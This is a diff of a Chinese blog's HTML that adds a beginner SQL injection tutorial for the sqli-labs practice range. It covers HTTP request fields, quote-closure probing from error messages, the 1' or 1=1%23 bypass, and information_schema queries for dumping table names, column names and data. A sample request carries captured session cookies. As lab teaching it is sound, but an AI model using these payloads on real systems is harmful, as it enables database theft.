@@ -232,8 +232,10 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /it/u=837208242,3555265853&amp;fm=3028&amp;app=3028&amp;f=PNG&amp;fmt=auto&amp;q=75&amp;size=f42_42 HTTP/1.1</span><br><span class="line">Host: gips0.baidu.com</span><br><span class="line">Cookie: BIDUPSID=B67E2BF35D4F1843D8F838D5B519DF39; PSTM=1783871164; BAIDUID=B67E2BF35D4F1843D7E22C6B8BD51DFA:FG=1; BA_HECTOR=ag8l242gah00200lag0l0104ag85841l57dlt28; BAIDUID_BFESS=B67E2BF35D4F1843D7E22C6B8BD51DFA:FG=1; ZFY=125qSvbgp0tXow49sK2MoWPjnCtpwoj41fJQPs4T:B78:C; PSINO=5; H_PS_PSSID=63140_67862_69294_71139_71268_71289_71303_71314_71364_71357_71370_71231_71441_71452_71449_71410_71243_71512_71546_71538_71536_71531_71541_71544_71560_71564_71553_71556_71567_71585_71599_71628_71649_71657_71665_71676_71773_71713_71786_71727_71744_71797_71826_71891_71915_71907; delPer=0; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;145&quot;, &quot;Not:A-Brand&quot;;v=&quot;99&quot;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8</span><br><span class="line">Sec-Fetch-Site: same-site</span><br><span class="line">Sec-Fetch-Mode: no-cors</span><br><span class="line">Sec-Fetch-Dest: image</span><br><span class="line">Referer: https://www.baidu.com/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Priority: i</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
 <p>我们这篇文章接下来主要会用到三个字段</p>
 <h5 id="1-第一行的GET-POST"><a href="#1-第一行的GET-POST" class="headerlink" title="1.第一行的GET&#x2F;POST"></a>1.第一行的GET&#x2F;POST</h5><p>如果你在开头看到GET，说明接下来你要上传的参数会附带在URL之后，比如说：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /it/u=837208242,3555265853&amp;fm=3028&amp;app=3028&amp;f=PNG&amp;fmt=auto&amp;q=75&amp;size=f42_42 HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>这里我们想要请求的id（这里比如1）就被附带在访问的网址url之后，我们也可以从url看出是否是使用GET的方式传参，当我们看到url末尾有类似“?(参数名) &#x3D;（参数）”的格式的时候，我们就可以确定是用GET的方式</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/less-1/?id=1</span><br></pre></td></tr></table></figure>
-<p>这里我们想要请求的id（这里比如1）就被附带在访问的网址url之后，我们也可以从url看出是否是使用GET的方式传参，当我们看到url末尾有类似“?(参数名) &#x3D;（参数）”的格式的时候，我们就可以确定是用gGET的方式</p>
 <p>如果你看到开头是以POST开头http头部，比如说:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /Less-12/ HTTP/1.1</span><br></pre></td></tr></table></figure>
 <p>说明接下来你要上传的参数会放在请求体里，放在请求头的下面，以表单的形式提交数据，比如这样：</p>
@@ -250,8 +252,63 @@
 <p>就说明你是从百度去搜索跳转这个网站的，相应的如果你浏览器直接输入网址则不会有这个字段</p>
 <h4 id="关于sql数据库"><a href="#关于sql数据库" class="headerlink" title="关于sql数据库"></a>关于sql数据库</h4><p>sql是专门用来跟数据库打交道的语言。<br>比如我们在后面比较常见的 <strong>select,union,extractvalue,updatexml</strong>等等等等。<br>然后我们需要理解一个网站里的数据库的格式类似用树状文件来表示类似于</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">服务器（Server）</span><br><span class="line">├── 数据库：security（靶场的数据库）</span><br><span class="line">│   ├── 表（Table）—— users</span><br><span class="line">│   │   ├── 字段（Column）</span><br><span class="line">│   │   │   ├── id</span><br><span class="line">│   │   │   ├── username</span><br><span class="line">│   │   │   └── password</span><br><span class="line">│   │   │</span><br><span class="line">│   │   └── 数据（Row）</span><br><span class="line">│   │       ├── id=1, username=admin,    password=admin123</span><br><span class="line">│   │       ├── id=2, username=zhangsan, password=abc456</span><br><span class="line">│   │       └── id=3, username=lisi,     password=789xyz</span><br><span class="line">│   │</span><br><span class="line">│   ├── 表（Table）—— emails</span><br><span class="line">│   │   ├── 字段：id, email, user_id</span><br><span class="line">│   │   └── 数据：</span><br><span class="line">│   │       ├── id=1, email=admin@qq.com,  user_id=1</span><br><span class="line">│   │       └── id=2, email=lisi@163.com,  user_id=3</span><br><span class="line">│   │</span><br><span class="line">│   └── 表（Table）—— logs</span><br><span class="line">│       ├── 字段：id, action, time</span><br><span class="line">│       └── 数据：...</span><br><span class="line">│</span><br><span class="line">├── 数据库：wordpress（博客系统的数据库）</span><br><span class="line">│   └── ...</span><br><span class="line">│</span><br><span class="line">└── 数据库：shop（商城的数据库）</span><br><span class="line">    └── ...</span><br></pre></td></tr></table></figure>
-<p>(这里一开始我就是自顾自觉得一服务器里只有一个数据库才会卡着理解了好久ww)<br>接下来我们开始正式学习：<br>开始前请准备好：1.hackbar 2.sqlilabs</p>
-<h2 id="基础绕过"><a href="#基础绕过" class="headerlink" title="基础绕过"></a>基础绕过</h2><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h2 id="文件读写注入"><a href="#文件读写注入" class="headerlink" title="文件读写注入"></a>文件读写注入</h2><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2>
+<p>(这里一开始我就是自顾自觉得一服务器里只有一个数据库才会卡着理解了好久ww)<br>接下来我们开始正式学习：<br>开始前请准备好：</p>
+<p>1.hackbar(浏览器插件上就可以下载) </p>
+<p>2.sqlilabs</p>
+<h2 id="基础绕过"><a href="#基础绕过" class="headerlink" title="基础绕过"></a>基础绕过</h2><p>很多网站在接收用户输入时，会把你的输入直接拼接到 SQL 语句中，而没有做任何过滤。所谓”绕过”，就是通过构造特殊的输入，让原本的 SQL 语句逻辑被改变，从而达成我们想要的效果（比如绕过登录、获取隐藏数据）。</p>
+<p>假如我们的后端有一段这样SQL:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;$input&#x27;  //意思就是从users表里找到id为【用户输入参数】的数据</span><br></pre></td></tr></table></figure>
+
+<p>假如我们咋在输入id的输入框中写入<strong>1’ or 1&#x3D;1%23</strong></p>
+<p>那么拼接后的sql注入就会变成:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1’ or 1=1#&#x27; （%2是#的URL编码，在解码后会被还原为#，#在sql中起到注释符的作用，相当于python中的//，不直接使用#是因为#在url中也是注释符，如果输入未编码的#比如说你输入了?id=1#xxxxx,服务器只会收到?id=1）</span><br></pre></td></tr></table></figure>
+
+<p>因为#起到注释的作用，所以实际就变成了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1’ or 1=1</span><br></pre></td></tr></table></figure>
+
+<p>发现了吗，我们输入的 ‘ 闭合了原本的 ’ 并且可以让我们输入一些非法的sql代码，这时候我们就达成了绕过的目的，并且可以通过注入一些命令来盗取数据库的数据。</p>
+<h4 id="探测闭合方式"><a href="#探测闭合方式" class="headerlink" title="探测闭合方式"></a>探测闭合方式</h4><p>在知道了最基础的注入原理之后，我们就要开始进一步了解探测闭合方式。</p>
+<p>在我们刚聚到的例子里：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;$input&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以很轻易的发现，这里是使用 ’ 闭合的，所以我们要在后面补上 ‘ 来绕过</p>
+<p>但是实际上，参数的包裹方式其实不止这一种，常见的有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-- 1. 单引号包裹（最常见）</span><br><span class="line">SELECT * FROM users WHERE id=&#x27;$id&#x27;</span><br><span class="line"></span><br><span class="line">-- 2. 单引号 + 括号</span><br><span class="line">SELECT * FROM users WHERE id=(&#x27;$id&#x27;)</span><br><span class="line"></span><br><span class="line">-- 3. 双引号包裹</span><br><span class="line">SELECT * FROM users WHERE id=&quot;$id&quot;</span><br><span class="line"></span><br><span class="line">-- 4. 无包裹（纯数字型）</span><br><span class="line">SELECT * FROM users WHERE id=$id</span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过以下的几个报错例子说明：<br><img src="E:\myblog\myblog\source\image\sql1.png" alt="报错截图1"></p>
+<p>我们可以看到，我们尝试注入‘时，它给了我们报错，这里报错告诉了我们具体错误位置在语句中位置，即：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>我们发现这里只剩了一个 ’ 而我们恰好注入了一个 ‘ ，所以我们可以推的，这里后端代码大概率是我们刚才说到的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=$id LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>这样的形式，因此我们这里就不需要凑 ‘ 去闭合。</p>
+<p>再比如说下面这个例子</p>
+<p><img src="E:\myblog\myblog\source\image\sql2.png" alt="报错截图2"></p>
+<p>这里我们可以看到，它返回的报错结果说具体报错在语句中长这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;1&#x27;&#x27;) LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>因为我们输入了一个 ’ 所以后端代码大概率长这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>因此我们应该用 ‘）去闭合</p>
+<p>再比如说最后这个例子：<br><img src="E:\myblog\myblog\source\image\sql3.png" alt="报错截图3"></p>
+<p>注意：这里我们使用了1“来进行测试注入</p>
+<p>我们发现错误代码长这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;1&quot;&quot;) LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>因为我们注入的是”，所以我们可以推断出，后端代码大概率长这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=(&quot;$id&quot;) LIMIT 0，1</span><br></pre></td></tr></table></figure>
+
+<p>所以我们这里的正确注入方式应该是“）</p>
+<h4 id="简单脱库流程"><a href="#简单脱库流程" class="headerlink" title="简单脱库流程"></a>简单脱库流程</h4><p>首先我们先来学习几个基础的函数和语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">database() -&gt;返回当前数据库的名字</span><br><span class="line">concat(参数1，参数2) -&gt;可以理解为将两个字符串相加合成一个字符串</span><br><span class="line">group_concat() -&gt;与上相同，不同的是将返回的值排成一行</span><br><span class="line">select * from xxx where 条件1 -&gt;（这里*是通配符表示从里面查到的所有数据）这里的意思就是从xxx找到满足条件1的所有数据</span><br><span class="line">information_schema -&gt;可以理解为服务器</span><br><span class="line">information_schema.tables -&gt;可以理解为服务器里所有表格</span><br><span class="line">information_schema.columns -&gt;可以理解为服务器里所有列</span><br><span class="line">table_schema -&gt;可以理解为该表格对应的数据库，即，返回包含这个表格的数据库</span><br></pre></td></tr></table></figure>
+
+<p>在理解了上述函数和语句之后我们可以开始构造一些恶意payload来对数据库进行脱库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line">//从所有数据表中找到数据名和当前网站访问的数据库相同的数据库，找到里面所有的表名</span><br><span class="line"></span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_name=[从上面找到的可疑的表名] and table_schema=database()</span><br><span class="line">//从所有列表中找到所属表名和[可疑的表名]相同的且也属于该数据库的所有列名</span><br><span class="line"></span><br><span class="line">select [从上面找到的可疑列名] from [从上面找到的可疑的表名]</span><br><span class="line">//输出这张表中的所有[可疑列名]列里的数据</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就完成了基础数据库里的脱库的操作</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h2 id="文件读写注入"><a href="#文件读写注入" class="headerlink" title="文件读写注入"></a>文件读写注入</h2><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2>
         </div>
 
         
